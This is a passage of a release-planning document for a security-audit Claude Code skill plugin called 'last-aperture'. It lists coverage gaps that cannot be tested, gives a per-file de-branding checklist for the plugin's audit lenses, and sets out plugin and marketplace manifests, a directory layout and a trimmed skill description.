- **Minimum-necessary judgment on treatment-context surfaces.** Â§164.502(b)(2)(i) exempts them, and there is no oracle for "clinically necessary." The lens's own recipe correctly excludes them; the exclusion is a permanent coverage gap, not an oversight.
- **De-identification by expert determination** (Â§164.514(b)(1)) and **re-identification risk in free-text clinical notes.** Safe Harbor's 18 categories are testable; statistical-disclosure risk is not.
- **Provenance of fixture and seed data** â€” whether test data is real patient data. The proposed production-derived hash manifest would require sourcing production data, which the hard rails forbid outright.
- **Multi-step chain exploitability** (the new attack-chaining lens). Chains are elevated in Phase 2 from individually-proven links; the composed path through a real production topology cannot be executed under local-only rails. Chain findings inherit their links' tiers and the elevation itself is always analytical.
- **Missing-threat and completeness claims** (threat-modeling, and the new completeness lens). You cannot write a test that fails because an analysis is absent. Architectural-erosion linting (5.11) tests conformance to a boundary someone already articulated â€” never whether the boundary is the right one.
- **Benignity of a pinned third-party dependency.** A 40-hex SHA proves immutability, not that the pinned commit is safe. Reviewing what the pinned action or package actually does is manual, and the tj-actions class specifically defeats every automated check except pinning.
- **Live-account cloud reachability facts:** whether a permissive security group is attached to anything internet-reachable, whether an over-broad role is assumable by an untrusted principal, whether IMDSv2 is enforced on running instances, whether an admission controller is installed in the production cluster. All require the account, all forbidden. This is why 5.11 findings should be written as configuration defects with stated reachability assumptions.
- **Real CI-provider behaviour:** secret masking, log retention, cache-scope isolation, OIDC trust-policy evaluation. Only the provider can demonstrate these.
- **Timing side channels as a pass/fail gate.** Behavioural assertions (5.6, 5.10) prove the constant-time API is *called*; they do not measure the channel, and crypto-deep-dive is right that a wall-clock gate is flaky and unpersuasive.
- **Legal and regulatory determinations:** lawful basis under GDPR Art 6, DPIA necessity, controller/processor characterisation, transfer adequacy, whether a specific cookie is "strictly necessary," and whether a chosen retention period is *appropriate* (enforcement is testable, appropriateness is not).
- **Model robustness itself** (llm-and-ai). Every LLM recipe deliberately tests the harness with a worst-case-compliant scripted fake. Whether a given model resists a given injection is nondeterministic and out of scope â€” state that as a design decision, not a gap.
- **Unspecified business-logic invariants** (the new business-logic lens). With no written spec there is nothing to assert against; findings there are reasoning about intent and will be UNPROVEN unless the auditor can extract an invariant the codebase already claims elsewhere.
- **Human and process controls:** workforce training, sanction policy, incident-response readiness, physical safeguards, and anything social-engineering adjacent.

## 6. De-branding checklist

43 branding-class items across the ten existing reference files. The three new cross-cutting lenses (`attack-chaining`, `business-logic`, `completeness`) are written fresh and carry nothing to scrub â€” the only rule for them is that they must not reintroduce the two patterns below.

Two patterns account for most of the list, and both are cheaper to fix as a global rule than item by item:

1. **Vertical tell** â€” `PHI` leading a list in a general-purpose lens (`web-and-api`, `cloud-and-iac`, `threat-modeling`). Global rule: outside `hipaa-and-phi.md`, write "regulated data (PII, PHI, cardholder data)" and cross-reference the owning lens by filename; never lead with PHI.
2. **Named-vendor contractual verdict** â€” "Cloudflare â€” offers BAA", "Stripe â€” limited BAA scope", "RevenueCat does this correctly". Global rule: a lens may name a vendor as an *example of a capability*, never as an *assertion about that vendor's terms or correctness*. Contractual facts become instructions to verify, with a `last_verified` field.

| Lens file | Quoted text | Action |
|---|---|---|
| `cicd-and-supply-chain.md` | `- SAST in CI? (CodeQL, Semgrep, Snyk)` | **Genericize.** Product name-drops read as endorsement under MIT. â†’ "SAST gating the pipeline (e.g. CodeQL, Semgrep, or a commercial equivalent)". Same treatment for the Trivy/Grype, gitleaks/trufflehog, and Cosign/Notary lists; add the CI-native analyzers this lens actually needs (`zizmor`, `actionlint`, `poutine`). |
| `cicd-and-supply-chain.md` | "For most products, aim for Build L2-L3. Flag if a security-sensitive product is at Build L0/L1â€¦" | **Genericize.** "For most products" is inherited house policy. â†’ decision rule the auditor derives from the repo: L1 for artifacts never consumed outside the org; L2 minimum for anything published to a public registry or shipped to customers; L3 where a third party executes it with elevated privilege or it carries regulatory weight. |
| `cicd-and-supply-chain.md` | "Mixed registry configurations across team â€” one developer's machine builds differently than CI" | **Genericize.** Presumes visibility into an internal team's laptops. â†’ repo-observable: "registry configuration lives only in user-level config (`~/.npmrc`, `~/.config/pip/pip.conf`) rather than a committed, CI-enforced file â€” local and CI resolution can differ." |
| `cicd-and-supply-chain.md` | "**SolarWinds (2020)**: Build system compromise, injected code into legitimate binaryâ€¦" | **Keep** â€” with citations. Publicly reported incidents (SolarWinds, Codecov, ua-parser-js/coa/rc, PyTorch, 3CX) are normal in a public reference; the requirement is accuracy, not anonymization. Add "publicly reported" framing plus a linkable reference each, fix the 3CX characterization, correct ua-parser-js to 2021. |
| `cicd-and-supply-chain.md` | "Are there documented security requirements for code?" (with "Patch SLAs documented?", "Process for triaging reported vulns?", "Threat modeling step in design process?") | **Remove** from this lens. Reads as an internal compliance worksheet and is unanswerable from a repo. Move to `privacy-and-compliance.md`, or retain flagged "org-level â€” answer N/A when auditing code only" so subagents stop filing them as findings. |
| `cloud-and-iac.md` | "Logs retain too short (regulatory minimums: HIPAA 6 years, PCI 1 year)" and "**Public S3/GCS/Blob bucket with PHI/PII**: Critical" | **Genericize.** The only vertical lean in the cloud lens and a direct origin tell. â†’ "regulated data" / "data the compliance lens classifies as sensitive". Durations move to `hipaa-and-phi.md` (and note the 6-year clock is Â§164.316(b)(2)(i) documentation retention, not log retention) and `privacy-and-compliance.md` (PCI: 12 months) so one lens owns each number. |
| `cloud-and-iac.md` | "Load this for Terraform, Pulumi, CloudFormation, Dockerfiles, Kubernetes manifests, Helm charts, AWS/Azure/GCP SDK code, and cloud configuration." | **Remove.** Router instruction addressed to the orchestrator, not the auditor. Content moves to `activates_on.paths`/`signals`; body opens "## Scope â€” you own the following surfaces: â€¦". |
| `crypto-deep-dive.md` | "Load this when auditing code that implements or uses cryptography beyond standard library calls" | **Remove.** Same router coupling. This is the *only* branding-class item in the file â€” zero hits for company, tenant, product, or individual names. |
| `crypto-deep-dive.md` | `see "It's 255:19AM. Do you know what your validation criteria are?"` | **Keep** â€” with attribution. Not branding but the same MIT-release defect class: bare title, no author, no URL, no date. Attribute (hdevalence, 2020) with URL; add Chalkias/Garillot/Nikolaenko, "Taming the Many EdDSAs", SSR 2020. Same pass for "Per OWASP 2023". |
| `hipaa-and-phi.md` | "## Microsoft Teams / 365 specific notes\n\n(Relevant to Microsoft Teams / Microsoft 365 healthcare integrations.)" | **Remove.** The clearest residue of private origin â€” the parenthetical restates its own heading and is a placeholder left behind after an org name was stripped. Twelve bullets on Teams/365 with no equivalent for Epic, Oracle Health/Cerner, Health Cloud, HealthLake, or any FHIR server tells the reader whose stack this is. Either generalize to "Collaboration and UCaaS platforms" with Teams/Zoom/Slack/Workspace as parallel examples, or move to `references/vendor-notes/` outside the audit path. |
| `hipaa-and-phi.md` | "**LLM providers**: Anthropic, OpenAI â€” both offer BAAs for enterprise; verify the API key is using a BAA-covered account, not a personal/individual one." | **Genericize.** Naming Anthropic first in a Claude Code skill reads as placement. â†’ "Confirm the model endpoint is on an account covered by a signed BAA (not an individual/personal key), that zero-retention or no-training terms are enabled, and that vendor-side prompt/completion logging is disabled or BAA-covered." Provider names survive only in `llm-and-ai.md`, dated. |
| `hipaa-and-phi.md` | "**CDNs**: Cloudflare â€” offers BAA. CloudFront â€” covered. Akamai â€” covered. Verify." | **Remove.** Asserting named vendors' contractual posture in a public repo is a maintenance burden and needless liability (Cloudflare's BAA is Enterprise-tier only; HIPAA-eligible service lists rotate quarterly). Convert lines 110â€“118 wholesale into a verification procedure plus an empty table template the adopter fills in for its own stack, with a `last_verified` column and a header disclaimer. |
| `hipaa-and-phi.md` | "**Payment processors**: Stripe â€” limited BAA scope; for healthcare-specific use cases verify." | **Remove.** Same problem plus an inaccurate characterization of a named company's position. â†’ the regulation-anchored rule: the payment-processing exclusion, and the metadata scope-creep check on what rides along in `description`/`metadata`. |
| `hipaa-and-phi.md` | "**Support tools**: Intercom, Zendesk, Drift â€” varies." | **Remove.** "Varies" has no audit value and only date-stamps the roster (Drift reads as a 2021 stack choice). â†’ generic control: any embedded support widget or chat SDK on an authenticated PHI surface needs a BAA *and* confirmation it does not capture DOM content, form fields, or transcripts to an uncovered host. |
| `hipaa-and-phi.md` | "Marketing pixels (Meta, Google Ads) on pages with PHI â€” Meta Pixel + healthcare = active enforcement area (2023-2024)" | **Genericize and re-date.** An undated-then-stale parenthetical is worse than no date. â†’ standing control: "no third-party tag may load on an authenticated PHI surface", with the legal history â€” including the June 2024 *AHA v. Becerra* vacatur â€” in a dated footnote. Non-US adopters must be able to read the control without inheriting a snapshot of US enforcement news. |
| `hipaa-and-phi.md` | "## Output format for HIPAA audit mode" | **Keep, relocated.** Not company-specific but it breaks the lens skeleton: `threat-modeling.md` defines a competing template at line 173, so two lenses loaded together give a subagent contradictory output instructions. Lift the report contract into the parent SKILL.md; this lens retains only the HIPAA-specific section names (BAA scope concerns, minimum necessary observations) under `## Report format override` â€” the one lens permitted to have that heading. |
| `llm-and-ai.md` | "### Anthropic Claude\n- Constitutional behavior is robust but not infallible\n- Tool use API takes structured tools; less prone to \"model outputs random JSON\" issues" | **Remove.** In a repo that will be read as vendor-published, a provider section that leads with the vendor, calls its alignment "robust", and calls its API "less prone" to a failure mode attributed to competitors is promotion, not security guidance â€” and neither claim is auditable from code. Replace the whole subsection with a provider-agnostic questionnaire: default retention and override, ZDR eligibility, BAA/DPA availability, whether the tier trains on payloads by default, sub-processors, region pinning, prompt-cache and batch-store TTLs. |
| `llm-and-ai.md` | "### OpenAI\n- Function calling vs. tool use\n- Assistants API stores conversation history server-side â€” audit retention settings" | **Remove.** Half a retired naming distinction, half a deprecated API. A thin dated section for one vendor next to a flattering section for another is the worst of both. The durable idea ("find out what the provider stores by default and whether the code overrode it") folds into the questionnaire; concrete API surface (`store=True`, `cache_control`, `trust_remote_code=True`) moves to `activates_on.signals` where it greps instead of ages. |
| `llm-and-ai.md` | "Zero-data-retention available for enterprise contracts; verify BAA if handling PHI" | **Genericize and date.** â†’ "confirm in writing, for the specific account and tier this API key belongs to: retention, training use, and BAA/DPA coverage." Any retained vendor status gets an "as of \<YYYY-MM\>, verify before relying on this" prefix. PHI grading defers to `hipaa-and-phi.md`. |
| `llm-and-ai.md` | "Logging full conversations including PII to non-BAA'd telemetry (Datadog, Sentry, etc.)" | **Keep names, remove the claim.** The contract assertion is wrong for at least Datadog, which publishes a BAA and a HIPAA-eligible configuration. Keep the vendors purely as examples of *where prompts leak to*, and add the destinations this list misses and which are the real 2026 exposure: LLM tracing/eval platforms and self-hosted trace stores, which capture prompts, completions, and tool arguments by default. |
| `mobile.md` | "â€¦with React Native/Expo-specific additions for the stacks the user actually ships." | **Remove** the trailing clause. References one private user's stack. â†’ "with additional depth on React Native/Expo, the most common cross-platform stack." |
| `mobile.md` | "## Firebase / Expo / RevenueCat patterns" | **Genericize.** â†’ "## Client-authoritative state and BaaS patterns", with the three vendors demoted to parenthetical examples. |
| `mobile.md` | "For React Native/Expo apps using Firebase and RevenueCat:" | **Genericize.** â†’ "For apps whose backend is a BaaS (Firebase/Supabase/Appwrite) and/or whose entitlements come from an IAP wrapper (RevenueCat, Adapty, or direct StoreKit 2 / Play Billing):" |
| `mobile.md` | "**RevenueCat receipt validation** â€¦ RevenueCat does this correctly when used as intended; flag if app uses local entitlement caches as the source of truthâ€¦" | **Remove** the endorsement clause. An MIT security lens must not carry a vendor assurance it cannot verify. â†’ generic control: entitlement state validated server-side against the store (StoreKit 2 `Transaction.currentEntitlements` verified server-side, Play `purchases.subscriptions.get`, or RTDN / App Store Server Notifications); a cached local flag is never the source of truth for unlocking paid or privileged features. |
| `mobile.md` | "**Custom [consumer-app feature name redacted]** â€” if coins are persisted only client-side, they can be edited. Server-authoritative." | **Genericize.** One private product's feature. â†’ "Client-persisted economy or scoring state (virtual currency, credits, streaks, leaderboards) â€” any value that gates a reward or is compared between users must be server-authoritative; local writes are attacker-controlled input." |
| `mobile.md` | "**[consumer-app feature name redacted]** â€” pairing flow needs auth (token/QR code with expiry), not just \"enter your partner's email\" which enables enumeration." | **Genericize.** Names a specific consumer app's feature. â†’ "Account pairing / invite / device-linking flows â€” single-use, short-expiry, high-entropy token (deep link or QR) bound to the inviter's session; identifier-only pairing is both an enumeration oracle and an unauthenticated write to another user's graph." |
| `mobile.md` | "**[consumer-app feature name redacted]** â€” same as coins; server-authoritative or signed/HMAC'd at minimum." | **Remove.** Fold into the generalized client-authoritative-state bullet; drop the product-specific framing. Also drop "signed/HMAC'd at minimum" as an acceptable fallback â€” HMAC'ing a value the client can replay does not make it authoritative. Retain only with an explicit caveat that it prevents tampering, not replay or rollback. |
| `mobile.md` | "Code signing keys committed to repo or shared via Slack" | **Genericize.** â†’ "chat/email/ticket attachments". Low priority, one-word fix. |
| `mobile.md` | "Source maps uploaded to Sentry/Bugsnag/etc. â€” good for debugging, bad if those services are misconfigured to public" | **Keep.** Illustrative, no contractual or correctness claim attached. Append "or any crash-reporting/observability backend" so the check is not read as Sentry/Bugsnag-only. |
| `privacy-and-compliance.md` | "Most teams \"outsource the problem\" via Stripe, Braintree, etc., which is correct." | **Genericize.** Reads as endorsing two US processors and excludes EU/APAC readers. â†’ "route card entry to a PCI-validated hosted solution â€” a processor-hosted redirect or processor-domain iframe/hosted fields â€” so cardholder data never reaches your servers (e.g. Stripe, Adyen, Braintree, Checkout.com, Mollie)." |
| `privacy-and-compliance.md` | "iframe / hosted-fields pattern (Stripe Elements, Braintree Hosted Fields, etc.):" | **Keep** as marked examples. Lead with the vendor-neutral property that actually determines PCI scope â€” "payment fields served in an iframe from the processor's own origin" â€” and add at least one non-US example. The audit question that follows is already vendor-neutral; keep it verbatim. |
| `privacy-and-compliance.md` | "Google Analytics 4: cookieless mode possible but full mode requires consent under GDPR" | **Genericize.** â†’ vendor-neutral test: "does the analytics tag support a consent-denied mode, does it actually respect it, and is there a DPA plus a valid transfer route for the vendor?", with GA4/Consent Mode as one named example. (Separately: the consent obligation is ePrivacy Art 5(3), not GDPR â€” accuracy fix, tracked elsewhere.) |
| `privacy-and-compliance.md` | "**Card numbers in transit unencrypted**: Critical (rare in 2026 but still happens via inadvertent logging)" | **Remove** the hardcoded year. â†’ "still seen in practice". Add one `last_reviewed` frontmatter field so every time-bound legal claim in the file ages from a single place; apply to "required as of 2024", "becoming more states", "active enforcement area". |
| `privacy-and-compliance.md` | "### Data Processing Agreements (DPAs) / Article 28\n- Like BAAs for HIPAA â€” contracts with processors" | **Remove** the analogy. A standalone lens must not explain an EU concept by reference to a US healthcare instrument defined in another file. State Art 28(3) on its own terms (documented instructions, confidentiality, security measures, sub-processor authorisation, assistance with data-subject rights, deletion/return at termination) and cross-reference `hipaa-and-phi.md` by filename. Also drop "BAA" from "**No DPA / BAA with processor of personal data**: High" â€” the HIPAA lens owns BAA severity, and the mixed line guarantees duplicate findings. |
| `salesforce.md` | "like `IsApproved__c` or `OwnerId`" | **Genericize.** Appears twice as *the* example escalation field, breaks Salesforce's own naming convention (`Is_Approved__c`), and reads as a real custom field lifted from the author's org. â†’ describe the class: "any field that gates a decision (approval/status flags), any field that determines record access (`OwnerId`, `RecordTypeId`, a field used by criteria-based sharing), or any monetary field." |
| `salesforce.md` | "Search for `setOwnerId`, `setIsApproved`, or DML on records the user didn't create" | **Remove** `setIsApproved`. Not a Salesforce API and not a convention â€” a setter name from one specific codebase, so the grep can never fire for anyone else. â†’ platform-real sinks: `.put('` on an SObject, direct `OwnerId`/`RecordTypeId` assignment, `JSON.deserialize(payload, SomeObject.class)`, `insert new ...Share`, `insert new PermissionSetAssignment`. |
| `salesforce.md` | `FeatureManagement.checkPermission('My_Custom_Perm')` | **Genericize.** â†’ `'Your_Custom_Permission_API_Name'`, unmistakably a placeholder. Same for `Foo`/`Bar` in `Schema.sObjectType.Foo.fields.Bar.isAccessible()` â†’ use a standard object (`Schema.SObjectType.Account.fields.AnnualRevenue`) so the snippet compiles in any org. |
| `salesforce.md` | "**Missing FLS on read**: High if the field is sensitive (SSN, comp, health), Medium otherwise." | **Genericize.** "comp" is internal shorthand and will read as a typo externally. â†’ "government identifiers, compensation, health/behavioral-health data, financial account numbers." Replace the inline "health" judgment with a pointer to `hipaa-and-phi.md` to avoid duplicate severity calls. |
| `salesforce.md` | "**Remote Site Settings** that whitelist `*.something.com` are looser than they need to be." | **Genericize AND correct the platform fact.** `*.something.com` reads as a redacted real domain, so use `*.example.com` (RFC 2606), and change "whitelist" to "allowlist" throughout. **[CORRECTED 2026-07-27: Remote Site Settings do not accept wildcard hosts at all — an RSS url is a concrete scheme + host (+ port). Wildcards belong to CSP Trusted Sites, which is where this guidance was relocated during the salesforce-platform migration. Remote Site Settings keep the narrower and still-real breadth finding: an RSS authorizes every path on the host, which a Named Credential removes. Do not restore the wildcard-as-RSS framing.]** |
| `salesforce.md` | "When the user pastes Apex/LWC, these are the highest-signal greps to do mentally" | **Remove.** Assumes the interactive chat product context; a lens handed to an auditor subagent is working a checkout, not a paste. â†’ "When auditing a Salesforce repo, these greps have the highest yield", with runnable commands scoped to `force-app/**`. |
| `threat-modeling.md` | "This format complements the per-finding format in the main SKILL.mdâ€¦" and "Load this when the user explicitly asks for a threat model" | **Remove** both. A subagent handed only this file cannot resolve "the main SKILL.md", which breaks the verbatim-handoff property. Router instruction moves to the router; restate inline only what the auditor needs â€” that this output format replaces the per-finding format, and that Evidence and Confidence remain mandatory per threat. |
| `threat-modeling.md` | "when stakes are high (auth flows, payment, PHI)" (and "Mention only if the product justifies it (healthcare, infra, defense)") | **Genericize.** Authorial tell, not tenant content, but PHI is privileged twice in a vertical-neutral lens. â†’ "auth flows, payments, credentials, regulated data (PHI/PII/cardholder), and anything with tenant isolation". File is otherwise clean. |
| `web-and-api.md` | "Error handling that leaks secrets, stack traces, file paths, SQL, tokens, or PHI/PII" | **Genericize.** The single vertical artifact in an otherwise clean file. â†’ "regulated data (PII, PHI, cardholder data)", with classification deferred to `hipaa-and-phi.md` / `privacy-and-compliance.md`. Apply to any PHI-first phrasing introduced while writing the new Scope section. |

### Verdict: does the Salesforce lens ship publicly?

**Yes.** Every branding item in `salesforce.md` is a *cosmetic* tell, not a disclosure. The six flagged strings are `IsApproved__c`, `setIsApproved`, `My_Custom_Perm`, `Foo`/`Bar`, `*.something.com`, and `comp` â€” field-name-shaped and domain-shaped fragments with nothing recoverable behind them. Nothing in the file names an org, an org ID, a package namespace, a managed-package name, a named integration, a person, a customer, or a URL. Nothing describes a specific data model, sharing configuration, or deployed architecture. There is no way to reconstruct an org's implementation from any of it: at worst a reader learns that the author's org has an approval flag on some object, which is true of essentially every Salesforce org in existence.

The substance is exactly the generic platform knowledge the license is meant to distribute. The `without sharing` / FLS / `stripInaccessible` / `WITH USER_MODE` / `@AuraEnabled` spine is the correct spine for auditing any Apex codebase, and the recon verdict calls it structurally the most useful file in the set for a Salesforce auditor. Withholding it because six identifiers look org-flavored would be the wrong trade.

**Must be scrubbed before it ships**, all six in one pass: (1) `IsApproved__c` â†’ the field-class description; (2) `setIsApproved` â†’ the real platform sinks (`.put('`, `OwnerId`/`RecordTypeId` assignment, `JSON.deserialize`, `insert new ...Share`, `insert new PermissionSetAssignment`) â€” this one is mandatory regardless of branding, since a grep for a private setter name is dead code for every other reader; (3) `My_Custom_Perm` â†’ `'Your_Custom_Permission_API_Name'`; (4) `Foo`/`Bar` â†’ `Schema.SObjectType.Account.fields.AnnualRevenue`; (5) `*.something.com` â†’ `*.example.com`, plus whitelist â†’ allowlist throughout; (6) `comp` â†’ "compensation", with the health example deferring to `hipaa-and-phi.md`. Also drop the "when the user pastes Apex/LWC" framing. Separately and not a de-branding matter: the six technical errors in the recon verdict (`WITH USER_MODE` attributed to 48.0 rather than 56.0 and to DML rather than SOQL-only, `System.runAs()` outside tests, record-triggered Flow context, the `@AuraEnabled` threat path, the SOQL escape snippet that discards its escaped value, `Profile` as the FLS-escalation flagship) are hard blockers on the same release â€” a published Salesforce lens that a certified developer can catch being wrong about `USER_MODE` loses the credibility the file otherwise earns.

### Residual risk

After the full checklist is applied, the prose is clean but the *shape* of the corpus still fingerprints the originating organization: a reader who notices that thirteen lenses exist and that `hipaa-and-phi` is among the most detailed, that a Salesforce lens exists at all, that PHI needed genericizing out of three unrelated lenses, and that a twelve-bullet Microsoft Teams/365 section was there to remove, can reasonably infer a US healthcare or behavioral-health provider running Salesforce on Microsoft 365 â€” and the mobile lens's original couple-linking / reward-coin / XP triad additionally implies a consumer relationship app in the same author's orbit. This is unscrubbable without either rewriting coverage or bringing the HIPAA lens's sibling verticals (Epic, Cerner, Health Cloud, FHIR) to parity, and it is a fair price for shipping domain depth; the inference is about a *category* of organization, not an identifiable one. The genuinely actionable residual leaks are outside the prose and must be handled at release time: commit-author email domains and any squashed history, the `fixtures/` corpus (clean and vulnerable fixtures must be synthetic, not reduced from real internal code â€” check `EXPECTED.md` too), and file metadata in anything published alongside the repo.

## 7. Packaging decisions

Ship the repo as a **single-plugin repo that is also its own marketplace**: repo root = plugin root = marketplace root, with `.claude-plugin/` holding both manifests and `skills/` at the root. This is the shape verified against three real installs on this machine (`superpowers`, `superpowers-extended-cc-marketplace`, `claude-md-management`), and it lets a user install with two commands:

```
/plugin marketplace add GH-OWNER/last-aperture
/plugin install last-aperture@last-aperture-marketplace
```

Two substitutions before publish: `GH-OWNER` -> the real GitHub account, and confirm the author name you want public. The recon did not verify maintainer identity, and `author.email` / `owner.email` are optional in both schemas, so they are deliberately omitted rather than guessed.

### `.claude-plugin/plugin.json` (ship literally)

```json
{
  "$schema": "https://json.schemastore.org/claude-code-plugin-manifest.json",
  "name": "last-aperture",
  "description": "Adversarial security audit: lens fan-out, tiered proof, and patches. Local repo and localhost only.",
  "author": {
    "name": "Gerald Maida",
    "url": "https://github.com/GH-OWNER"
  },
  "homepage": "https://github.com/GH-OWNER/last-aperture",
  "repository": "https://github.com/GH-OWNER/last-aperture",
  "license": "MIT",
  "keywords": ["security", "audit", "red-team", "appsec", "hipaa", "skills"]
}
```

Field status, per the plugins reference:

- **Required: `name` only.** It must be kebab-case with no spaces; it becomes the namespace prefix (`/last-aperture:...`). The manifest file itself is optional â€” Claude Code would derive the name from the directory and auto-discover `skills/` â€” but an MIT release needs `license`, `repository`, and `description` to be machine-readable, so ship it.
- **No `"skills"` key.** `skills/` at the plugin root is *always* scanned. The official `superpowers` plugin ships 14 skills with no `skills` key at all. Declaring it buys nothing and risks the v2.1.140+ "ignored folder" warning.
- **`version` intentionally absent.** With no `version`, Claude Code falls back to the git commit SHA, so every push reaches users. Setting `"version": "1.0.0"` and then forgetting to bump it makes `/plugin update` report "already at the latest version" forever. Add `version` only at the first tagged stable release, and note that plugin.json's `version` **wins** over the marketplace entry's.
- **Deliberately not included:** `displayName` (v2.1.143+ only, and adds nothing over `last-aperture`), `defaultEnabled` (leaving it unset means installed-and-enabled; `false` would make the skill silently absent until `claude plugin enable`), `dependencies`, `hooks`, `mcpServers`, `commands`, `agents`. This plugin has no components outside `skills/`.
- The source data is silent on any length cap for plugin.json's `description`; the conservative choice is one short line, since the SKILL.md `description` is what actually drives invocation.

### `.claude-plugin/marketplace.json` (ship literally)

```json
{
  "name": "last-aperture-marketplace",
  "description": "Marketplace for the last-aperture skill plugin.",
  "owner": {
    "name": "Gerald Maida",
    "url": "https://github.com/GH-OWNER"
  },
  "plugins": [
    {
      "name": "last-aperture",
      "source": "./",
      "description": "Adversarial security audit: lens fan-out, tiered proof, and patches. Local repo and localhost only.",
      "category": "security",
      "tags": ["security", "audit", "red-team", "hipaa"]
    }
  ]
}
```

Field status, per the plugin-marketplaces reference:

- **Required top level: `name`, `owner`, `plugins`.** `owner` requires only `owner.name`; `email` and `url` are optional. Each `plugins[]` entry requires `name` and `source`.
- **`"source": "./"`** because the plugin *is* the repo. Relative sources resolve against the marketplace root â€” the directory *containing* `.claude-plugin/` â€” not against `.claude-plugin/` itself. Never `"../"`. No `github`/`git-subdir`/`npm` source object is needed here.
- **Marketplace `name` must differ from the plugin name** in practice because it becomes the `@suffix` on install, and each user can register only one marketplace per name â€” a same-named add silently replaces the previous one. `last-aperture-marketplace` is distinctive and is not on the reserved list (which includes `agent-skills`, `healthcare`, `claude-plugins-official`, `anthropic-plugins`, and impersonating variants; reserved names are re-validated on **every** load, not just on add).
- **`$schema` omitted here on purpose.** The verification confirms `$schema` is an accepted optional top-level marketplace key and that Anthropic's own catalog uses it, but it never records the marketplace schema URL. Rather than invent one, omit it; plugin.json's schema URL is the one that was actually verified.
- **`strict` left unset** (defaults to `true`), which makes plugin.json the authority and the marketplace entry a supplement. Do not set `strict: false` â€” combined with any component declaration in plugin.json it hard-fails with "conflicting manifests".
- **No `version` in the entry**, matching plugin.json, so the commit SHA governs updates. `category` and `tags` are documented marketplace-only optional keys and are safe to include.

### Directory layout for skill discovery

```
last-aperture/                          # git repo root = plugin root = marketplace root
â”œâ”€â”€ .claude-plugin/
â”‚   â”œâ”€â”€ plugin.json                      # ONLY these two files may ever live here
â”‚   â””â”€â”€ marketplace.json
â”œâ”€â”€ skills/                              # AT THE ROOT. auto-scanned. no manifest key.
â”‚   â””â”€â”€ last-aperture/                  # dir name -> /last-aperture:last-aperture
â”‚       â”œâ”€â”€ SKILL.md                     # exact filename, exact case
â”‚       â””â”€â”€ lenses/                      # supporting files: no manifest entry needed
â”‚           â”œâ”€â”€ _topics.md               # canonical topic-slug registry
â”‚           â”œâ”€â”€ attack-chaining.md
â”‚           â”œâ”€â”€ business-logic.md
â”‚           â”œâ”€â”€ cicd-and-supply-chain.md
â”‚           â”œâ”€â”€ cloud-and-iac.md
â”‚           â”œâ”€â”€ completeness.md
â”‚           â”œâ”€â”€ crypto-deep-dive.md
â”‚           â”œâ”€â”€ hipaa-and-phi.md
â”‚           â”œâ”€â”€ llm-and-ai.md
â”‚           â”œâ”€â”€ mobile.md
â”‚           â”œâ”€â”€ privacy-and-compliance.md
â”‚           â”œâ”€â”€ salesforce.md
â”‚           â”œâ”€â”€ threat-modeling.md
â”‚           â””â”€â”€ web-and-api.md
â”œâ”€â”€ fixtures/                            # repo root: CI test data, not skill content
â”‚   â”œâ”€â”€ EXPECTED.md
â”‚   â”œâ”€â”€ vulnerable/
â”‚   â””â”€â”€ clean/
â”œâ”€â”€ scripts/
â”‚   â””â”€â”€ check-topic-ownership.mjs         # CI: every slug owned by exactly one lens
â”œâ”€â”€ .github/
â”‚   â””â”€â”€ workflows/
â”‚       â””â”€â”€ ci.yml                        # claude plugin validate ./ --strict + slug invariant + fixtures
â”œâ”€â”€ README.md
â””â”€â”€ LICENSE                               # MIT
```

Decisions embedded in that tree:

1. **Keep the skill nested under `skills/` even though there is only one.** The root-`SKILL.md` single-skill layout is legal (v2.1.142+) but the verified precedent for a one-skill plugin is `frontend-design`, which still nests at `skills/frontend-design/SKILL.md`. Nesting also leaves room to split the cross-cutting lenses into their own skills later without a repackaging.
2. **`lenses/` lives inside the skill directory** because SKILL.md references the lens files by relative path, and supporting subdirectories inside a skill dir need no manifest declaration â€” verified by `claude-md-improver`, which ships `skills/claude-md-improver/references/`.
3. **`fixtures/` lives at the repo root, not inside the skill.** They are CI inputs, not material an auditor subagent should ever be handed, and root placement keeps CI paths stable. If a later decision moves them beside the skill, they still must not land in `.claude-plugin/`.
4. **The invocation name is `/last-aperture:last-aperture`** (bare `/last-aperture` also resolves unless another command claims it). This is accepted rather than worked around; `frontend-design:frontend-design` is the same shape in the shipped official plugin.
5. **No `CLAUDE.md` at the plugin root.** A plugin-root CLAUDE.md is not loaded as context â€” all instructions must live in SKILL.md or the lenses.

### SKILL.md `description`: verified cap and required action

There is a hard cap and the current description **already violates it**. `description` + `when_to_use` combined are truncated at **1,536 characters** in the skill listing, cut **from the end** (`skillListingMaxDescChars`). The current last-aperture description measures 1,534 characters up to the point where the listing renders an ellipsis â€” i.e. it is being clipped at the cap right now, and whatever follows is already invisible to the matcher. There is also a softer second budget: the whole skill listing is capped at ~1% of the context window (`skillListingBudgetFraction` / `SLASH_COMMAND_TOOL_CHAR_BUDGET`), and on overflow Claude Code **drops descriptions entirely**, starting with least-invoked skills â€” so a verbose description is a liability in a user's populated skill directory, not just in this repo.

Action items:

- **Rewrite the description to roughly 800 characters, front-loaded.** Both trigger modes (commit/deploy signals and HIPAA/PHI) must appear before the halfway mark, and the "do NOT fire" clause must not be the only thing at the tail. Concretely, this 812-character version preserves every trigger keyword and fits with headroom:

  ```yaml
  description: 'Adversarially audit code for security vulnerabilities, prove each one with a failing test, and produce patched versions. Use for any explicit security review, pen test, audit, vulnerability scan, threat model, or red team pass. ALSO auto-trigger at commit/deploy moments - "ready to commit", "ready to ship", "ready to merge", "ready for review", "final version", "deploying this", "going to prod", "putting this in the PR", "signing off on this" - that is the last cheap chance to catch issues before they ship. SECOND MODE, HIPAA/PHI audit: fire for HIPAA or PHI audits, healthcare compliance reviews, BAA scope checks, or code touching patient records, medical data, behavioral health, or peer support records. Any language or stack. Do NOT fire merely because code is being written, iterated on, or debugged.'
  ```

- **Do not move the overflow into `when_to_use`** â€” it counts toward the same 1,536-character cap. Move the exhaustive rationale and the full phrase inventory into the SKILL.md **body**, which is not part of the listing.
- **Quote the scalar.** The text contains `:` and `-` and embedded double quotes; use a single-quoted YAML scalar (doubling any internal apostrophe) as above. Malformed frontmatter does not hard-fail â€” Claude Code loads the body with *empty* metadata, so `/last-aperture` keeps working while auto-invocation silently dies forever.
- **No other frontmatter field is required.** Every SKILL.md key is optional; `description` is merely "recommended". Deliberately do not set `disable-model-invocation` or `user-invocable: false` (either would look exactly like a broken install), and do not set `paths` on SKILL.md â€” path gating belongs in each lens's `activates_on.paths`, not on the skill entry point, or the skill stops firing on the commit/deploy phrases that have no file context.
